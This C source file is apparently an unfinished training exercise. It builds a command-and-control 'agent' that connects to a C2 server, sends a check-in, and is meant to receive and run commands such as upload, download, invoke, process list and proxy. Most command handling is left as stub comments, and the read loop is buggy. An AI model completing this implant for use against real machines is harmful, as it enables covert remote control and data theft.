/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality 
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>


// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    int agent_fd = 0;
    Response *response = NULL;
    // call our hello world function
    say_hello();

    // Agent logic
        // connect
    agent_fd = connect_to_server();
        // Send checkin
    response = checkin_command();
    send_response(agent_fd, response);
	// begin main execution loop
    // use fd for while condition
        	// receive_command (see Networking section below)

        	// perform_command
        	// send_response
		// repeat until shutdown command is received

    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    
    // perform an "if else" tree checking the command against all known command strings
    // receiving a valid command should result in calling the appropriate command function
    // if the shutdown command is received, an appropriate response should be returned to 
    // the server, then the client should exit

    /* Check if recieved command parameter are valid
    char* cmd;
    uint32_t cmd_len;
    char* args;
    uint32_t  args_len;

    is the total length of the message an unsigned int32?
    is cmd_len an unsigned int32?
    is the length of the args string an unsigned int32?  
    
    cmd->cmd_len
    Input validation for pointers, do I have a Null pointer?
        NULL != cmd, null != rsp_out

    */

    //Check if command exists from known goof commands (ex do I have a hostname command? Yes? then execute)

    

    RR_DEBUG_PRINT("received: shutdown command\n")
    RR_DEBUG_PRINT("received: sleep command\n")
    RR_DEBUG_PRINT("received: download command\n")
    RR_DEBUG_PRINT("received: upload command\n")
    RR_DEBUG_PRINT("received: hostname command\n")
    RR_DEBUG_PRINT("received: process list command\n")
    RR_DEBUG_PRINT("received: netstat command\n")
    RR_DEBUG_PRINT("received: invoke command\n")
    RR_DEBUG_PRINT("received: proxy command\n")

    return 1;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server. 
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    // Serialize Response struct into byte stream (see commands.c in the command_io directory)
    // Send response byte stream to server
    char *serialized_response = NULL;
    uint32_t total_tx = 0;
    uint32_t bytes_tx = 0;

    uint32_t stream_size = serialize_response(rsp, &serialized_response);

    while(total_tx < stream_size){
        bytes_tx = send(sock_fd, serialized_response + total_tx, stream_size - total_tx, 0);
        if(bytes_tx == -1){
            checkfree(serialized_response);
            return true;
        }

        total_tx += bytes_tx;
    }

    printf("Response has been sent\n");
    checkfree(serialized_response);
    return false;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    uint32_t msg_size = 0;
    uint32_t size_read = 0;
    char *read_stream = NULL;
    ssize_t read_ret_val = 0;

    // Read message size from socket
    //TODO error handling for <=0 conditions ((0)bytes read in, connection closed; error reading (-1))
    read_ret_val = read(sock_fd, &msg_size, 4);

    msg_size = ntohl(msg_size);

    //Allocate memory for read stream
    read_stream = calloc(msg_size, sizeof(char)); //Ask Brandon, what is the difference btw this instantiation of calloc and
                                                  // calloc(1, msg_size * sizeof(char))?
                                                  
    // Validate message (make sure its not null, nothing to read, connection was closed, message values dont match up)

    //Do recieve until, skip message timeout
    //While size read dows not equal msg size:
    //  do ret_val read combo
    //      if > 0
            //     amnt_recv'd += ret_val(buffer + amount recv'd)
            // else
            //     PANIC!!!!

    while (size_read != msg_size){
        read_ret_val = read(sock_fd, read_stream, msg_size);
        if (read_ret_val >= 0)
            size_read += read_ret_val;
        else{
            printf("Time to panic\n");
            return NULL;
       }
    }

    // deserialize the command received from the server and populate a Command struct
    cmd = deserialize_command(msg_size, read_stream);

    // free memory of read_stream
    free(read_stream);

    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    int sock_fd = 0;
    struct sockaddr_in server;

    //Create a socket & error check
    if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("Socket creation failed....\n");
        exit(0);
    }
    else
        printf("Socket successfully created...\n");

    //Set the server address
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    printf("Server address set...\n");

    //Create the connection to the server
    if (connect(sock_fd, &server, sizeof(server)) < 0){
        printf("Server connection error: %s\n", strerror(errno));
        exit(0);
    }
    else
        printf("Connection made...\n");
    return sock_fd;
}
